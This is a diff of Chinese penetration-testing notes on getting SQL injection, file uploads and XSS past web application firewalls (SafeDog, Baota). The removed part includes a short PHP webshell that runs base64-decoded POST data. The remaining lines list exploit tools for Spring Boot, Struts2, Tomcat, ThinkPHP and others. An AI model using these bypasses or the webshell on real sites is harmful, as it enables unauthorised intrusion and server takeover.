- python代理请求关键代码
-
-```c
-requests.get(urls,headers=hearders,proxies=proxy)
-```
-
-##### 经验
-
-阿里云：不能设置爬虫请求头，只能设置代理池或者延时3秒
-BT：扫描字典不能有敏感文件如bak等，这就要用文件上传绕过策略了
-
-
-
-### SQL绕过
-
-宝塔：拦截方式/*
-
-#### 默认未开启的防御绕过
-
-##### sqlmap
-
-如需sqlmap注入，修改us头，加入代理池防止CC拦截，自写Tamper脚本
-
-```bash
-# waf.py 是自己写的sqlmap-proxy="http://127.0.0.1"--tamper="waf.py"--random-agent
-```
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210716230027420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-##### 手动
-
-主要利用安全狗是整段语句检测的，而SQL是逐步执行的
-**情况：目标网站允许接收其他请求方式；方法：post提交+敏感语句处理**
-当安全狗拒绝你直接用 `id=1 and 1=1 `直接插入在url的get请求中,你试着将其用在post请求中图是因为加了database所以被墙了。
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210707234946157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-这时候是可以绕过WAF的，但绕过不等于你注入成功。能否获得注入成功，取决于目标网站是否接受别的请求方式数据。如下图就只接受了GET。
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708001152534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-如果这种方式能绕过且数据能被接收，但你却不能进行下一步，因为在默认情况下安全狗禁止了一切数据库查询，连post请求方式也不行。
-<font color="#dd00dd">执行敏感关键字：database()</font><br /> 
-但是安全狗监测数据库的注入的方式是整体语句，举个例子，`database()`被防御，但是`database`或者`()`不被防御。因此你可以尝试用注释符号隔开
-![在这里插入图片描述](https://img-blog.csdnimg.cn/202107080041210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-<font color="#dd00dd">执行敏感关键字：union select </font><br /> 
-
-%00截断   %23:#  A:单独字符串 #A：代表注释，干扰  %0A:换行符
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708123824908.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-****
-
-其他绕过补充：上面一个已经足够了，但是想试试别的方法可以看以下
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708152942575.png)
-
-
-
-
-**情况：只允许接收get数据包；方法：**
-一般注入都是在get,安全狗对此就更多的使用防御。
-
-### 文件上传绕过
-
-#### 安全狗
-
-**数据溢出-防匹配(xxx...)**
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180150666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-**符号变异-防匹配`(' " ;)`**
-如图上传时修改数据包使其不闭合，可以绕过WAF。WAF在识别时一直想找闭合，但却找不着。但是php却会自动处理这类文件。对于安全狗，去掉后面的引号可以成功，但是去掉前面的引号却会导致绕过失败。这是因为安全狗的识别机制![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709201118607.png)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709202310936.png)
-或者你使用`;.php`分号使安全狗认为是语句结束了 
-**数据截断-防匹配(换行)**
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180250295.png)
-**重复数据-防匹配(参数多次)**
-写了多次，服务器是以最后一位为主
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180311818.png)
-安全狗误认为x.php没有对应的key,但是其实是写给了filename。上传后的文件是x.php
-![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070918032977.png)
-上传后的文件是jpeg;x.php
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180333728.png)
-斜杠也可以作为条件绕过
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709180342299.png)
-
-### xss 绕过
-
-你在测试时你需要用好F12多监控对方网站到底做了哪些防御。![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710195547722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-单引号括起来后能防止对方的强制加上如h2之类的干扰
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710200005339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-标签语法替换
-![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071021435745.png)
-
-特殊符号干扰
-/ #
-因爲/在js中代表语句的结束
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210710214005267.png)
-
-提交方式更改
-垃圾数据溢出
-加密解密算法
-
-* 采用此方法你应该查看目标网站可以加解密的方式
-
-结合其他漏洞绕过
-
-### 权限控制拦截
-
-以下几种方式都可以轻松绕过防护软件，这些木马直接躺在本地服务器检测机制会比输入要小，比如输入不能有base64_decode.但是木马中却是支持的
-
-**变量覆盖**
-
-可以绕过安全狗、宝塔，但是还是现在WAF都有变量追踪了，如果不追踪输入参数，就可以绕过
-
-```bash
-# 访问是 x=b & y=assert<?php	$a = $_GET['x']		# $a=b	$$a = $_GET['y']	# $b=assert	# base64解码是为了提交post请求时一些如phpinfo的敏感词直接被栏	$b(base64_decode($_POST['z']))		# assert($_POST['z'])?>
-```
-
-**加密**
-或用php加密 http://www.phpjm.net/，或冰蝎自带加密
-
-**异或生成**
-
-
-
-### 其他绕过总结
-
-**base64被拦截**
-这里主要说说怎么去考虑替换编码。因为你输入phpinfo是会报错的，通常在输入base64_decode也会被宝塔拦截。那么你就试试其他可逆编码方式？
-或关键词替换、拼接、php变量套用。。
-
-**文件包含路径**
-文件包含：以上几种
-..\    ..../     ..\.\等
-
 
 
 # 经验积累
@@ -4823,46 +4546,11 @@ IIS是只适用于windows的中间件
 PROPFIND 栈溢出漏洞
 RCE CVE-2017-7269
 PUT任意文件写入
+
 ### JAVAWEB
-                (1) Springboot：
 
-                       github上一份整理得比较好的SpringBoot的checklist：https://github.com/LandGrey/SpringBootVulExploit
+                (1) Springboot：                   github上一份整理得比较好的SpringBoot的checklist：https://github.com/LandGrey/SpringBootVulExploit                   其他链接：                           https://blog.gdssecurity.com/labs/2018/4/18/jolokia-vulnerabilities-rce-xss.html                           https://www.veracode.com/blog/research/exploiting-spring-boot-actuators                           https://github.com/mpgn/Spring-Boot-Actuator-Exploit                   关于springboot引入devtools时的特定条件下的反序列化漏洞利用，可参考：https://xz.aliyun.com/t/8349              (2) JBoss：                        https://github.com/joaomatosf/jexboss             (3) struts2：                       https://github.com/HatBoy/Struts2-Scan                       K8哥哥写的struts2图形化利用工具：其个人网站：http://k8gege.org/p/72f1fea6.html             (4) Tomcat：                       https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi             (5) ThinkPHP：                       https://github.com/admintony/thinkPHPBatchPoc.git             (6) PHP-FPM                      https://github.com/neex/phuip-fpizdam             (7) solr                   https://github.com/Imanfeng/Apache-Solr-RCE
 
-                       其他链接：
-
-                               https://blog.gdssecurity.com/labs/2018/4/18/jolokia-vulnerabilities-rce-xss.html
-
-                               https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
-
-                               https://github.com/mpgn/Spring-Boot-Actuator-Exploit
-
-                       关于springboot引入devtools时的特定条件下的反序列化漏洞利用，可参考：https://xz.aliyun.com/t/8349 
-
-                 (2) JBoss：
-
-                            https://github.com/joaomatosf/jexboss
-
-                 (3) struts2：
-
-                           https://github.com/HatBoy/Struts2-Scan
-
-                           K8哥哥写的struts2图形化利用工具：其个人网站：http://k8gege.org/p/72f1fea6.html
-
-                 (4) Tomcat：
-
-                           https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
-
-                 (5) ThinkPHP：
-
-                           https://github.com/admintony/thinkPHPBatchPoc.git
-
-                 (6) PHP-FPM
-
-                          https://github.com/neex/phuip-fpizdam
-
-                 (7) solr
-
-                       https://github.com/Imanfeng/Apache-Solr-RCE
 Weblogic系列漏洞：弱口令 && 后台getshell、SSRF漏洞、反序列化RCE漏洞
 
 Jboss系列漏洞：未授权访问Getshell、反序列化RCE漏洞
@@ -4901,15 +4589,21 @@ Dubbo 系列漏洞
 
 
 ### Nginx
+
 ### Shiro
+
 　　Shiro 默认密钥致命令执行漏洞、Shiro rememberMe 反序列化漏洞（Shiro-550）
 　　Shiro Padding Oracle Attack（Shiro-721）
+
 ### tomcat
+
 ### struct2
+
 漏洞扫描工具 https://github.com/HatBoy/Struts2-Scan
 
 S2-001到S2-061漏洞
 安全公告：https://cwiki.apache.org/confluence/display/WW/Security+Bulletins
+
 ## 组件
 
 
@@ -5021,6 +4715,7 @@ import_request_variables()函数就是把GET、POST、COOKIE的参数注册成�
 
 ### JAVAWEB
 
+你可以阅读《java代码审计入门》免费阅读[链接](https://weread.qq.com/web/reader/c8732a70726fa058c87154bkc81322c012c81e728d9d180)
 更多请查看《攻击javaweb应用》
 
 
@@ -5155,9 +4850,17 @@ git clone https://www.github.com/landgrey/pydictor.gitcd pydictor/python pydicto
 ### fuzzy
 
 国外fuzzy字典https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
+
 # API漏洞
+
 # 微信小程序漏洞
+
 反编译方法https://www.cnblogs.com/xiaozi/p/15003105.html
+
+# PC端软件
+
+需要拦截数据包可用https://www.proxifier.com/download/或者你用其他全局代理，需破解。直接用win的全局代理不能很好的配合burpsuite，因为你会产生大量垃圾数据还可能拦截不到数据包
+
 
 # APP漏洞
 
